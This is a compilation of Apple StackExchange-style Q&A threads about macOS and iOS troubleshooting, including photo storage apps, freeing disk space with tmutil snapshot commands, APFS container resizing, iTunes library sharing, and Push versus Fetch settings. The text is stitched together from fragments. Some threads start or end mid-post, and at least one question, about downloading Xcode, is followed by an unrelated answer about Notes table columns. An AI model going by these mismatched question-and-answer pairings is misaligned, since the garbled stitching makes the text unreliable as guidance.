I would like to be able to sort them by size to see which photos/videos are taking up the most storage in order to either delete or transfer them to my computer.\nSorting iOS photos by file size is not offered by the stock iOS Photos app. However, I remember using a third-party app a few years ago to sort and see which photos and videos were taking up the most space, so I know that it exists. The closest thing I've found right now by searching is PhoTop. However, it doesn't seem to include videos in its sorting, which is quite important to me. I was thinking of using iOS 11's new built in video delete feature (found in the iPhone Storage section of the Settings app), but that only seems to be accessible in certain circumstances. \nDoes anyone know which app I am talking about?\n\nA: Right after posting this question I managed to find a bunch of apps which do something like this. I will post what they are and any advantages/disadvantages I see from them (also, please note that my mini reviews are only accurate as of my writing this; features may have been added or annoyances fixed after I wrote all this).\n\nPhoto Cleaner, $1.99\nThe app I was originally looking for. It has multiple features such as the ability to detect duplicate and similar photos, and it allows you to browse your screenshots (while seeing their file sizes). Most importantly, it shows you your photos/videos in a grid format with their sizes on the icons, allowing you to decide which ones to keep/remove.\nHowever, it doesn't seem to go much further than that. Even though you can see screenshots' file sizes which is helpful, it doesn't allow you to sort the screenshots by file size, which would have been greatly helpful. You also can't inspect the photos from the \"similar photos\" feature and see which one you'd like to keep over the other(s). Surprisingly it doesn't even allow you to see the date/time the photos were taken which would allow you to look them up in the photos app.\nThe way I worked around this was by deleting a photo, going to the trash where it is kept (third party apps are not allowed to permanently delete photos – they will always be sent to the trash), and looking up the date from there. This is however inefficient and provides a bad user experience.\nSomething else I noticed is that videos don't seem to play when trying to view them from within this app, most likely a bug because they seem to play file with the other apps I mentioned. \nVideo Compressor, Free w/ IAP\nThis is actually a video compressor app, but shows you your biggest photos/videos as well as their file sizes. However, it doesn't allow you to delete or mark the photos/videos in any way, or even allow you to look them up in the photos app (no date is shows). So for this purpose it's not very useful.\niCompress, Free w/ IAP\nAlthough also a compressor app, works much like Photo Cleaner without the extra features. Has the added benefits of being able to play videos properly and being able to see extra information about the videos, like creation/modification date, duration, resolution, frame rate and bitrate. Probably one of the best apps for the job, in my opinion, especially since it's free. However, it doesn't show photos – only videos.\nPhoTop, Free w/ IAP\nThe app I mentioned in the question. It's quite good for seeing your biggest photos. In this way, it can be used in tandem with iCompress which shows only videos (alternatively, you could use Photo Cleaner to deal with photos if you're set on using iCompress).\n\nIn any case, one would preferably try all of them out to see which ones work best for them. The reviews I wrote are of course subject to my opinion, and although that might help someone make a decision, these apps are likely made for slightly different people/workflows. Use whatever works for you!\n", "Q: Why did all my menus go blank and views become illegible? MacBook Pro 15-inch 2017 i7 16GB\nOS Version: High Sierra 10.13.4 (it's possible it was an earlier version 10.13.3 or something because this occurred about a week ago)\nTake a look at these images though, I don't think anything particularly out of the ordinary happened, no catalyst that I can think of, but I was using my computer one day and all of my menus and UI started glitching. I ended up restarting the computer which fixed everything, but it was a system-wide glitch which impacted everything running.\n\n\n\nThere were other strange things I didn't get screenshots of like empty terminals, I could type but couldn't see anything. Every context menu of a running application after I clicked it would have a menu with nonsense text and images in it kind of similar to the last image above, of the text editor file menu.\n\nA: There are a couple clues here that indicate this is a software corruption of the graphics buffers and not a hardware issue.\n\n\n*\n\n*The issue corrects immediately after a reboot\n\n*The issue doesn’t affect the entire screen\n\n*The issue affects layers of image and not the overall picture\n\n\nSince the graphics architecture of macOS is that each layer of an image is allocated memory and then the software determines if a specific button or frame or windows is on screen and then if it’s visible on screen (whether minimized and visible as a thumbnail or if it’s not obscured by an element more front most than it) the corruption shown is either blanking or fuzzing the bits in one layer.\nHardware errors tend to get worse with time (often rapidly deteriorating) and the hardware doesn’t get cooler or somehow fix itself when the OS reloads. Yes the drivers are restarted and hardware might power down most of the units briefly as part of a restart, but in general it’s the same Mac after the restart as it was before.\nNow, none of that helps immediately.\nThe next time you get this corruption, I would open system preferences and make a new account. Log out of your current account that has the glitches and see if the glitches happen when you log in to the new account. If so, you know the glitches are either hardware or corruption in the base system. That’s good since you can either reinstall the OS or get hardware repair.\nIf logging in to the new user is clean - no issues. Log out of the new user and back in to your old user - not restarting the OS yet.\nIf the log in to the old user is glitchy - you need to isolate the software causes (update the OS, update your apps, clean your settings) or just reboot more often. If the old user is not glitchy, you have the least actionable case - it’s some corruption that happens rarely or by chance and “fixing” it will be hard if it’s not a system bug that Apple eventually fixes.\nGood luck, keep your backups current in case you get tired of this and choose to erase the OS entirely, reinstall a new OS and then move your data and apps back from the backup.\n", "Q: Unexpected Colour differences (MacBook Pro, OSX 10.11.6) I wrote a postscript file including a blue (0,0,255) RGB and a yellow (255,255,0) RGB shapes.\nWhen viewed (in Preview) and according to the apple DigitalColor meter set to \"native colours\" mode, the colours are different:\n     yellow becomes (252,255,54) \n     blue becomes (43,0,251)\nTo be sure the problem does not come from a bad postscript conversion, I used imagemagick to convert the postscript file into a raster image (png, tiff, gif,...).

How?\nShould I use another colour picker? Which one?\n\nA: While I don't know the exact details, the Digital Color Meter that comes with macOS is affected by the color profile settings in System Preferences > Displays > Color. Changing the display's color profile from Color LCD to P3 to Adobe RGB to whatever causes a solid color to read differently under the same Digital Color Meter profile selection.\nA photo editor with a dropper tool, specifically Photoshop, always selects the same color values, regardless of the display's color profile.\n", "Q: How can I download an older version of Xcode?

Right-click on these small rectangles and you'll be given an option to add row or column.\n\nA: Alt + ⌘ + ← or → will create column on the left or right\n\nA: As of macOS 12 Monterey the hotkey seems to be Option + ⌘ + ← or → to \"Add a new column to the right/left of the current column\"\nSource: https://support.apple.com/en-gb/guide/notes/apd46c25187e/mac#apd4184607ff\n", "Q: macOS not showing the actual free space I'm in the process of installing Windows 10 on my Macbook Pro (macOS 10.13.4/17E202, 256 GB of storage, no partition), but Boot Camp says I need at least 40 GB of storage.\nSo I freed up some space by removing some files, and \"About My Mac\" now shows almost 100 GB of free space on my Mac:\n\nHowever, the Disk Utility shows only 33 GB of free storage... 3 times less:\n\nThe trash is empty, and I restarted my computer twice. I also used Onyx utility to free up some more space, empty caches, etc. But there is still this huge difference.\nI tried to find \"hidden files\", that could cause this difference, using the Disk Inventory X app, but it shows 100 GB of free storage...\nAnother strange thing that happened: after I restart the computer, the status bar at the end of the finder shows 33 GB of free storage. But after 2-3 minutes, this number changes to about 100 GB... As if some cached values were used while the Mac is updating the folder sizes.\nI'm pretty sure I have 100 GB of free storage, because I removed dozens of GB of photos and apps.\nWhat's wrong? I'm kind of lost!\n\nA: You probably have some local snapshots on your drive, you can try to list the local snapshots with \ntmutil listlocalsnapshots /\n\nand with \ntmutil thinlocalsnapshots / 9999999999 1\n\nyou can delete all local snapshots and release the storage space.\nYou can find more information here How to thin your local Time Machine Snapshots on macOS High Sierra\n\nA: The amount of free space that can be allocated to run Windows can be determined by entering the following command in a  Terminal application window. Here, I have assumed you are using a single internal drive with just macOS installed.\ndiskutil apfs resizecontainer disk0s2 limits\n\n\nNote: This command does not change the computer in any way.\n\nNormally, you can subtract the minimum about from the maximum to get the free space that can be allocated for Windows. Also, there is an alternate \"Recommend\" minimum amount when macOS is installed. \nBelow is an example of the output from the above command.\nResize limits for APFS Physical Store partition disk0s2:\n  Current Physical Store partition size on map:   250.8 GB (250790264832 Bytes)\n  Minimum (constrained by files/snapshots):       175.6 GB (175553185382 Bytes)\n  Recommended minimum (if used with macOS):       186.5 GB (186453185382 Bytes)\n  Maximum (constrained by partition map space):   250.8 GB (250790264832 Bytes)\n\nIn this example, the maximum space that can be allocated to Windows is 250.8 GB - 175.6 GB = 75.2 GB. Although, since you have macOS installed, the recommended maximum space that can be allocated to Windows is 250.8 GB - 186.5 GB = 64.3 GB.\n\nNote: For 2015 an newer Macs, the maximum amounts may be reduced by the amount of storage required to hold the Windows installation files. In other words, the newest Macs no longer require a USB flash drive or DVD to install Windows. During the installation of Windows, files from both Microsoft and Apple are temporarily stored on the internal drive. This can reduce the maximum amount of storage that can be allocated to Windows. The amount of storage for these temporary files should be less than 16 GB.\n\n\nA: Commands given below resolved the issue for me. Listed and deleted local snapshot and it freed 230 GB on my machine.\n$ tmutil listlocalsnapshots /\ncom.apple.TimeMachine.2019-01-28-143406 \n$ tmutil deletelocalsnapshots 2019-01-28-143406  \n$ tmutil listlocalsnapshots /\n$\n\nMake sure it shows no file at the end.\n\nA: I had the same problem. After trying all sorts of things without success, i decided to erase my drive and do a clean install of High Sierra.\nThe first thing i did was clone the boot drive with Carbon Copy Cloner. After the clone was complete, the free space was correct (!).\nI have no idea why this worked, but the finder is showing the correct free space and updates instantly when i empty the trash.\nHope this helps\n\nA: To delete all local Time Machine snapshots in a single command, run this command in the Terminal, courtesy of this answer by Martin:\nfor d in $(tmutil listlocalsnapshotdates | grep \"-\"); do sudo tmutil deletelocalsnapshots $d; done\n\nYou may also skip sudo depending on your privileges.\ntmutil deletelocalsnapshots deletes about 1 snapshot every 30 sec, so if you have a bunch of snapshots, it will take time.\nTo view the snapshots before deleting them, run:\nfor d in $(tmutil listlocalsnapshotdates | grep \"-\"); do echo $d; done\n\n\nA: I ran into a similar situation of not able to recover a hugh trunk of disk space after deleting a large folder (> 700 GB).\nI finally found the reason (which was totally different from the answers above): It turned out I had various file aliases scattered throughout my system which pointed to the deleted folder.  (I thought they were merely symbolic links (as in Unix/Linux) but apparently such aliases were created as actual links by default (not symbolic ones). As such, as long as at least one of such aliases remained, the filesystem did not release the storage.\nRight after I collected all of those aliases and deleted them, my 700+ GB space were finally recovered ! (Of course, I put all the collected aliases into a tar file as a backup before I actually deleted them).\nHope this can help to resolve the mystery.\n\nA: According to Apple documentation, Time Machine \"automatically deletes (local) snapshots as they age or as space is needed for other things\". It could probably be a reason why the Storage tab in \"About My Mac\" considers the space occupied by Time Machine as \"free space\". The command df invoked through the Terminal should deliver better report on immediately available (free) space.\nThe documentation also mentions that a local snapshot should have a max life span of 24 hours. This is not always the case especially when a manual backup  is performed and local snapshot is created only for that specific backup event. The snapshot may stay there and you may need to manually delete it in order to free the space.\nTo free up disk space occupied by Time Machine, the tmutil tool is used from the command line. It is such an extensive tool that provides you with flexibility on dealing with Time Machine snapshots.\nThe command tmutil deletelocalsnaphots <snapshot_date> can be run immediately after getting the list of snapshots through tmutil listlocalsnapshots / or snapshot dates through tmutil listlocalsnapshotdates. This is a quick-win command to be invoked when you're under pressure to free up the disk space. Alternatively, the command tmutil thinlocalsnapshots / <purge_amount_bytes> 4 should suffice to selectively remove some parts of the snapshots while ensuring that at least one snapshot still exists.\nOne thing to note, when you list the local snapshots, no information is provided by the tool about the snapshot size.\n", "Q: Share Itunes Library with all users on same machine Looking to share my Itunes Library with my wife on same machine. SO for example, when I log off, and she logs in, I would like to be able to access my library in her ITunes. \nI have spent countless hours combing the internet with no success and wondered if this is now even possible. I have read this THIS stack exchange thread about how to share but it seems this method doesnt work. \n|\nWhen I open Itunes on my wifes account with OPTION key and choose the newly created Library from my existing account nothing gets imported. \nAnother method I tried and failed with is to simply export the the Library from my existing Itunes as XML. The result was that the playlists get loaded fine but all the songs are missing (except for 3 or 4 songs)!\nIt should be noted that all the Media for the playlists and libraries are in a shared folder that are accessible to my wife's account with read & write permissions turned on. \nI also tried setting up Home Sharing, but this does not seem to work on the same machine.  \nRunning Sierra 10.12.6 with Itunes version 12.7.2.60\nAt this point i have no clue what to do. Any help is appreciated. \n\nA: The trick to doing this is to have your iTunes library stored in a location that is accessible to both accounts (i.e. both users have read/write access), and to then configure iTunes in both accounts to use the same library.\nMy recommended approach for doing this is to use an external drive connected to your Mac and then configure iTunes within each of your Mac accounts to use that library.\nFollow these steps:\n\n\n*\n\n*Ensure iTunes is not running\n\n*Within Finder, move your iTunes library folder (by default this folder is located within ~/Music/iTunes/) to a location accessible by all user accounts. As mentioned above, my personal preference is to store it on an external drive connected to your Mac.\n\n*Hold down the option key and launch iTunes\n\n*You should now see the Choose iTunes Library prompt (see below)\n\n\n\n\n\n*Click on the Choose Library... button\n\n*Now navigate to the location you moved the library to at Step 2\n\n*iTunes should now open up and work as it's always done previously\n\n*Quit iTunes\n\n*Now log into your wife's account\n\n*Hold down the option key and launch iTunes\n\n*Repeat Steps 3, 4, 5 and 6\n\n\nAfter doing the above you'll be able to access the same iTunes library from either user account.\nIMPORTANT NOTES\n\n\n*\n\n*If you don't already, ensure you have a backup regime in place (e.g. using Time Machine)\n\n*If using an external drive (as per my recommended approach) ensure you include this new location with whatever backup software you use (so that it's getting backed up)\n\n*There are a number of reasons why I prefer using an external drive for my iTunes library. Some include:\n\n\n*\n\n*It frees up space on your main boot volume\n\n*It results in faster transfer rates (in the event your internal drive is not an SSD)\n\n*I like to keep all my digital media on the same drive (i.e. I also use the same drive for my Photos library)\n\n*It makes your iTunes library (and others if they're on the same drive) easy to physically transfer (in the event you need to)\n\n\n\nA: I'm no expert on this, but my first ideas where:\n\n\n*\n\n*you could store the library in a public accesible part of the OSX (/Users/Shared/)\n\n*but then again: iTunes has incorporated Digital Rights management for buyed music and is probably not built to share music across all Users (could be also a public machine, thus enhancing the sharing of copyrighted material)\n\n*iTunes was not really designed for multiuser.\nSo I can't suggest more than trying to follow the accepted answer in the thread you mentioned. As they say there too: There's no ideal solution to perfectly sync two itunes even on the same machine.\nAn alternative can be:\nUse iTunes with one user, storing all the music in a publicly accesible folder (don't know if that works), and that the second user uses another program (e.g. vlc) to listen to the music.\n\nA: you can certainly just share one of the users music folder. Go to System Preferences, Sharing, File Sharing, click add, select your music folder, share to user you want to share with full read and write, then right click the shared folder and click apply to enclosed items. Then with iTunes closed on both accounts, hold option whilst launching iTunes this will display a prompt allowing you to select location of Library file, navigate to the library file you have shared and select. Now you will have the shared music library between users as they are both reading and writing to the same library file, however I have found that playlists will not update across user accounts, you can always export and import these. For good measure I also create a alias (shortcut) to music media that is shared from my account and pop into the wife's music folder so as far as she is concerned is just business a usual no need for her to do anything different to what she was doing to manage her own unshared library.

Your JavaScript uses the getElementsByClassName() method with the argument 'search-field has-drop-down-menu component', which seems to have come from nowhere.\nTherefore, to explain briefly about the getElementsByClassName() method, it is used to search within a collection of HTML elements for all the elements that have a class attribute with the value you specify as the argument.  For example, getElementsByClassName('foo') will match <div class=\"foo\">...</div>, and <a class=\"foo bar\">...</a>, but it will not match <p class=\"foobar\" id=\"foo\" name=\"foo\">...</p>.\nTo replace mytexthere inside the <div> element, you could use this method with the argument \"content\" (the class name of the <div> element); identify the correct index number if the method returns more than one item; then set the textContent property to the desired value:\n    document.getElementsByClassName('content')[2].textContent='...';\n\nwhere [2] would need to be changed to the correct index number from the list of elements returned by getElementsByClassName('content').\nThere are other JavaScript methods you can use, such as querySelector(), which—to be useful—will require you read up on CSS Selectors.

I'm really confused about changing Language verse Region on an iPhone running iOS11.\nApple discusses here about changing the Language and the Region:\n\n\"For iOS, changing the language restarts Springboard and quits running\n  apps. So the next time you launch an iOS app, it uses the new language\n  setting. ... For iOS and Mac, the region and calendar settings can be\n  changed at any time, even when your app is running.\"\n\nSo, I take that to mean that if I change the Language, the App will have to be restarted.  But, if I change the Region, the App will not have to be restarted.  I've been chasing my tail for an hour or more wondering why my App was shutting down when I was just changing the Region.

Or some setting to shorten the delay to wake-and-display?\nI have a Series 1 Apple Watch running watchOS 4.3.\n\nA: No. The only control you have is how long the screen stays lit once you activate.

When starting my MacBook in recovery mode with Command + s, it prompts me to Choose Network.... The process that takes place immediately after entering my Wi-Fi password can take several minutes and it's kinda frustrating.\nIs it possible to access recovery mode without connecting to the Internet? \n\nA: The Recovery Partition on the system disk corresponds to the version of the macOS installed and should be loaded when holding CmdR at boot (not CmdS). However, if there is no recovery partition on the disk it will automatically revert to Internet Recovery which means downloading the boot image from Apple servers. Mac will also do that if there is a version mismatch from Recovery and macOS version installed. Remember that you should be able to use option key at boot which invokes Startup Manager which lets you select the available boot volumes, including the Recovery partition (without downloading from the Internet).\nNonetheless, according to HT204904 there are actually several key combinations for Recovery:\nCommandR - Install the latest macOS that was installed on your Mac, without upgrading to a later version.\nOptionCommandR - Upgrade to the latest macOS that is compatible with your Mac\nShiftOptionCommandR - Install the macOS that came with your Mac, or the version closest to it that is still available. \n", "Q: New file/database in OmniFocus 2 for macOS When first starting to use OmniFocus, it opens with some example data preloaded for practice. \nAm I supposed to delete that bogus data, and continue to use that existing file/database for my own data?

Once you've done that, you can set up sync with your existing sync server, then choose File / Replace Server Database... to erase any sync data on the server, putting your new empty database online in its place.

I know more or less how Push works, but why is there a Push on top (in Settings → Accounts & Passwords → Fetch New Data) then other options for iCloud, Outlook, Gmail etc?.\nIs any of these related to My Photo Stream or iCloud Photo Library? Do these use Push or Fetch too?\n\n\nA: The top push toggle allows you to override any accounts that have push set up. The data will then be fetched from the servers according to your fetch settings at the bottom.\niCloud and Outlook will be fetched with your current settings because you’ve essentially disabled push from any of your accounts (which saves battery and cell data). If you turn it on, they will both be pushed immediately (meaning your phone is constantly “listening” to the server for any updates) because that is how you set them on an individual level (the override is now off).\nIf you click on iCloud/Outlook you’ll see this explained when push is selected: \n\n“If Push is not available [because you toggled it off], the Fetch schedule will be used.”\n\n———\nIn the comments of Nimesh’s answer you explain a flawed experiment. When you opened iCloud Drive on your phone, it fetched immediately. The way to test would be to send yourself an email from another device to either your Outlook or iCloud account and see how long it takes to get a notification, \nIf you have it set to fetch (check the server) every 30 minutes, it should come within 30 (not at 30 exactly, as it may be closer to the next time it checks the server).\nPush, on the other hand, would be instant.\nOf course the actual server changes immediately when you send an email etc but fetch vs push refers to how often it checks for those changes on your iPhone without you opening it “manually”. In practice, this is really only visible in terms of notifications (also whether the data would already be populated when you open the app).\n\nA: Not all services support Push. iCloud mail and Outlook are integrated with Apple services and Apple servers support pushing the content to iOS device. Not the case with other email providers like Gmail where the only resort is to fetch automatically or manually.\nThe fetch section allows one to configure fetching schedule for services which doesn't support Push. It also configures the fetching schedule for services supporting Push for the case when Push is turned off by the user.\n\nA: Thanks for you answers, you've clarified it very well.\nPlease allow me to sum this up and correct me if I'm wrong:\nThe Push and Fetch settings in iOS settings determine how often your device will check with service providers for updates for Mail, Calendar, Contacts, Notes, etc (with updates I don’t mean “software updates”, it’s just basically asking if there’s any new email, note, etc).  The reason for their existence is for the user to be able to decide how much battery, cellular (or WI-FI) data and other system resources (software and hardware workload) will be used for these services.  So if you’re lost in an airport and you’re concerned about the iPhone battery running out, you can set up these services to any of these Fetch options, or just put your iPhone into Low Power mode, which will set these to Fetch to save battery.\nThese settings are set up in Settings > Accounts & Passwords > Fetch new data (this is for iOS 11.3).\nHere’s how these settings operate:\nFetch queries the servers as often as you set it up, every 15 minutes, 30 minutes….  Each fetch takes a toll on system resources, so the longer the interval, the less of these resources will be consumed.\nPush is sort of “fetch all the time”, not sure what it does exactly, if it’s in fact querying the servers every 5 seconds or what, but it’s asking all the time if there’s any new email, contact, etc and it’s pretty instantaneous.  This of course consumes more battery and system resources, as the device is querying the different servers all the time asking for news.\nFetch can be also set up as “automatically”, meaning, “query the servers automatically whenever I put the iOS on charge if it’s connected to a WI-FI network”.  So if for example, you only plug in your iPhone before going to bed every day, that's when any new emails etc will be checked for, provided it's connected to WI-FI.\nFetch can also be set up as “manually”, meaning, whenever you open the app (such as the Mail app).  \nYou can set up Push or Fetch separately for each of these services and then you can override all of them at once by turning off “Push” at the top of the screen, which means that Fetch will be used for all services.  \n", "Q: Apple Extended Keyboard 2 - Caps lock key doesn't work in macOS High Sierra?

Water was spilled on it accidentally which shorted everything out. A 3rd party local computer repair shop got the machine working again except the keyboard. Since then it's been used with a Logitech Wireless PC USB keyboard without any problem, putting it to sleep when done, and waking it up via the external keyboard. This has been working fine without any issue.\nRecently the battery has completely drained out, effectively powering down the machine. Although the machine has been fully charged, it isn't responding to the Power button on the external keyboard.\nWhat options do I have to make the machine boot again?\n\nA: Various internet sources (YouTube, iFixit) mention that bridging two solder points with a flathead screwdriver will start up the MacBook Air.\nThe following iFixit question includes an answer showing the location of the two points in question on the 2015 MacBook Air:\niFixit.com\nMore images and repair guides also can be found on the iFixit site:\nhttps://www.ifixit.com/Device/MacBook_Air_13%22_Early_2015\nWith liquid damage, the chance the keyboard fails and no other damage is done is very low.

If you can play a file using VLC in Ubuntu, it can also be played by VLC on macOS.\nYou can download VLC for macOS here.\nClicking the download button will download a .dmg file in Downloads folder in Finder. To install VLC, simply double-click the .dmg file. A DMG file is identified as Apple Disk Image in macOS and is mounted as a volume in Finder. To install VLC simply copy VLC.app by dragging it into the /Applications directory.\n\nAlternatively, if you have Homebrew setup (a popular package manager for macOS), you can install VLC using Homebrew Cask by running:\nbrew cask install vlc\nVLC for macOS is not distributed via Mac App Store.

The \"rubber\" feet under an Apple Magic Keyboard 2 (MLA22D/A) are too slippery.\nWhat's the simplest, ideally reversible, way to increase the adhesive power of the rubber feet without ruining what is underneath the external keyboard, or a way to augment them with different anti-skid pads, feet, rubbers? \n\nA: The rubber feet on Apple's newer keyboards are teeny, tiny, little hard bumps, and they don't prevent the keyboard from sliding around on some types of surfaces at all (like they should). Judging from the dirt on mine they look like in addition to being very hard plastic they also only have a contact area of one square millimeter.\nI think the easiest, least destructive, and cheapest way would be to buy new soft rubber feet. The main point would be to make sure they are soft, not hard. Also, the larger the rubber feet, the more force they will be able to resist when being pushed around. \nI found two products on Amazon that could do the job just fine.

I heard the max temperature is 100°C, so I'm pretty far from that.\nWhat do you think ?\nThanks !\n\nA: Totally normal if on the low side. If your CPU is less than 15% idle, I expect you to get to 85 C internal for CPU proximity and higher for all the on die thermocouples. Running just unde 100 C is how the silicon is designed to operate at max thermal generation and high sustained load. \nAlso, if you use the command line tool to check temperatures or thermal load once every 15 minutes instead of having graphs checking every second you may find your CPU runs much cooler. After all, having those graphs update live in real time prevents the CPU from sleeping. \n pmset -g thermlog\n\nLots of people are surprised or at least concerned by temps:\n\n\n*\n\n*Are these temperatures alright?\n\n*CPU Die temperatures reaches 90° C, is that normal?\n\n*Is it normal for a 27\" iMac to have CPU core temperatures around 95C under 100% CPU load?\n\n*Retina MacBook Pro running very hot?\nFrom an engineering standpoint, the MacBook Pro and the iMac in the Mac Pro and iMac Pro all have the same power envelope design and push their CPU to 100 C when the work is available.  Once the CPU is at Max normal operating load then the kernel task begins to idle potential work so as not to exceed the final design for the processor. \n\nA: Another solution I have found for this in other forums, is to clean out the dust and accumulated crud from your PowerBook motherboard and internal fan.\nThis improves the cooling efficiency. Over time the Mac gets full of dust and can't cool so well.\nThis should be done very carefully, there are a bunch of YouTube videos about this.\nYou also need to buy a special screwdriver. This is called a 1.2 mm pentalobe, there are lots of these on eBay for a few bucks. You need one of these to remove the back because Apple use a special kind of screw that no-one else in the world uses, specifically to prevent you from doing anything to your PowerBook yourself.\nDo not do this unless you are comfortable with this kind of hardware task.\nFrom the searches I've done, apparently this will not void your warranty, but if you are worried about this, ask your iStore.\nThis is in addition to using the fix of using right hand ports as described above, which clearly solves the problem. \nIt doesn't apply to newer laptops unless they have been used in a very dusty environment.\n", "Q: Recording iOS screen with gestures Is there any way (without using accessibility feature) to record mobile screen with gestures like taps?\nI need to record how user is using my app and where exactly he taps.\nI found solution with Assistive Touch and new adding new gesture.\nBut while recording we have additional annoying home button on the screen and also tap circle.

I created a 412GB APFS container for mac and used the other 100GB for Linux. After wrestling with the issue, I learned that Apple blocks access to the Intel iGPU to third-party operating systems and Linux only uses the AMD GPU. I tried to delete the Linux partition using disk utility, but it did not see the Linux partitions, so I used a live CD to delete them. I am trying to reclaim that space to use on my Mac OS partition but it does not seem to be an option. Can I get help? I attached 3 pictures of what disk utility looks like for me.\n\n\n\nA: The Terminal application command is given below. You can enter this command while booted to macOS.\nsudo  diskutil  apfs  resizeContainer  disk0s2  0\n\nThis command has been known to fail if there is something wrong with your macOS APFS partition. Backing up important data is always a good idea.\nThe current version of the Disk Utility application assumes there will never be free space on a drive. When the Disk Utility removes a partition, the utility also returns the free space to another partition. Often, when one tries to do this with the diskutil command, two separate commands must be entered. The first command creates the free space and the second command adds the free space to a partition. You preformed the first part using live CD. The second command was given as my answer.\n", "Q: How to mount a .sparsebundle after External Hard drive mounts I have an external hard drive, with which there is a .sparsebundle that I use for TimeMachine backups.

However when I do this, the paths that I have in my script break.\nI am trying to run a dotnet core application and my shell script is simple:\n#!/bin/bash\ndotnet ${PWD}/OUTPUT/Calculator.dll \n\nWhere OUTPUT is the name of the folder with the dotnet release files in it.\nif the script is a .sh file, the script runs, but then the end user has to go to the terminal and type in ./runscript.sh or whatever I call it. \nThe other thing I noticed was that it looks like the output of the app removes any spaces changing:\ndotnet ${PWD}/OUTPUT/Calculator.dll \ninto:\ndotnet-${PWD}/OUTPUT/Calculator.dll \nHow do I make it so that my paths in the script don't break when I change it into a .tool extension?\n\nUPDATE:\nAs the answer suggested I have tried both:\ndotnet ~/OUTPUT/Calculator\nThis results into:\n\nNo executable found matching command \"dotnet-/Users/jeff_mba/OUTPUT/Calculator\"\n\nand:\ndotnet\\ ~/OUTPUT/Calculator\nwhich results into:\n\n/Users/jeff_mba/Projects/calctest/runcalc.command: line 3: dotnet ~/OUTPUT/Calculator: No such file or directory\n\nSo there is a spacing issue, but if I escape the space it still says the project is not found\nBut as per the screenshot it really does exist.\n\n\n\nA: You simply have to supply the full path to the DLL in the script.\nWhen you run the script from Terminal.app, the PWD environment variable contains the path to the folder where you're currently placed. I.e. if you use cd to move to other folders, the PWD environment variable is automatically updated to match.\nWhen you're using the GUI and double-clicking an icon, you're not really \"in\" a specific folder at the time. So the same concept of a PWD environment variable tracking your movements do not make sense.\nInstead simply supply the full path in the script, such as:\ndotnet ~/OUTPUT/Calculator.dll\n\nHere ~ means that currently logged in user's home folder.\n", "Q: How to unsync an iCloud folder without losing the original source I have synced both my Desktop and Documents folders on my iCloud. iCloud is now full and I no longer would like to keep them in sync.

Get used to it and soon enough you will be ok. You will visit sites (like SO) which will use the macos specific symbols and nobody will translate them for you.

When I plug it in again, it works perfectly and it is at the same percentage that I had left it at. What can I do?\n\nA: From your question I'm assuming the iPhone battery worked well prior to being dropped in the toilet.\nIt looks like you need to have the battery replaced.  If you have AppleCare, you should go to and Apple Store or contact Apple support to have the battery properly assessed and, if needed, replaced.  See this Apple page for info on replacing the battery.  I would recommend going this route as it appears to be the lowest cost option.\nIf you don't have AppleCare, you can go to any 3rd party that you trust to replace the battery.  You can also go to Apple to pay to have them replace it.\nIf you're handy, you can also replace the battery yourself.  \n\nA: A couple of months ago Apple initiated a iPhone battery replacement program. You can take advantage of this to have your battery replaced for some nominal cost, much less than what a normal battery costs. If you just want to replace your battery I'd call the nearest Apple Store and set up an appointment to get your battery replaced. Be sure to ask about their battery replacement program.\n\nA: It appears to be a battery related issue. It is recommended you get in touch with Apple Authorised Service Provider to get the issue identified and resolved. It may help if your iPhone is covered under limited warranty or Apple Care, but be forewarned that Liquid damages to iPhone are not covered under warranty.\nFor starters, you can contact Apple Online Support where you can discuss your issue with Apple Support Representative over Phone or Chat and arrive at possible solutions.\nOn the Apple Online Support website, select iPhone -> Battery Power & Charging -> Battery questions or troubleshooting. You can opt to chat with the support representative or request for a phone call.\n\nAlternatively, you can find a local authorized service provider and get the device physically inspected.\n\n", "Q: Can I upgrade the memory on late 2013 Retina MacBook Pro?

I am using MDM to configure e-mail accounts on iOS devices using Mail/Exchange ActiveSync payload. Is there a way to configure 3rd-party iOS apps like OneDrive and DropBox using MDM or Apple Configurator?\nI am aware that using MDM, an iOS device can be configured to come pre-installed with 3rd-party apps, but is there a way where the apps themselves can be configured too, like logging into one with a specific account?\n\nA: Go through the Managed Apps & Updates section in Mobile Device Management Protocol Reference guide.\n\nan MDM server can provide configuration dictionaries to managed apps and can read response dictionaries from those apps. Apps can take advantage of this functionality to preconfigure themselves in a supervised environment, such as a classroom setting.\n\nGo through the linked web-page. It is apparent that while it is possible to leverage MDM to configure an app but it will require support from the 3rd party app developer. An enterprise app created by the same company managing the device can program their app to be configured this way. Support for 3rd party app like Dropbox and OneDrive depends on how it was programmed by their development team.\nIt's recommended to get in touch with developer in app specific manner where this feature is required.\n", "Q: How to connect to wifi from single-user mode? the en0 wireless interface doesnt seem to be available from the terminal. is it possible to connect to known and/or new wifi hotspots from the single-user mode console?\nroot# ifconfig -a\nlo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384\n    options=3<RXCSUM,TXCSUM>\n    inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1\ngif0: flags=8010<POINTOPOINT,MULTICAST> mtu 1280\nstf0: flags=0<> mtu 1280\n\nroot# networksetup -setairportnetwork en0 <SSID> '<wifi password>'\nError obtaining SC session.\nAll Wi-Fi network services are disabled.\n\nmy specifications:\nsh-3.2# system_profiler SPSoftwareDataType\nSoftware:\n\n    System Software Overview:\n\n      System Version: OS X 10.8.5 (12F45)\n      Kernel Version: Darwin 12.5.0\n      Boot Volume: lily\n      Boot Mode: Normal\n      Computer Name: lily’s MacBook Air\n      User Name: System Administrator (root)\n      Secure Virtual Memory: Enabled\n      Time since boot: 12:37\n\n\nA: To my knowledge this is not possible as the necessary services/daemons that enable networking don‘t start in single user mode.\n", "Q: How do I lock my MBP screen without locking my keychain?

To set this up, first set up your screensaver if you don't have one. Then open System Preferences/Security and Privacy. Click the first tab in that window named General.  The 2nd line on this box allows you to set a password associated with the screensaver.\n\nA: This is not possible since interactive keychain usage is limited to console authorization.

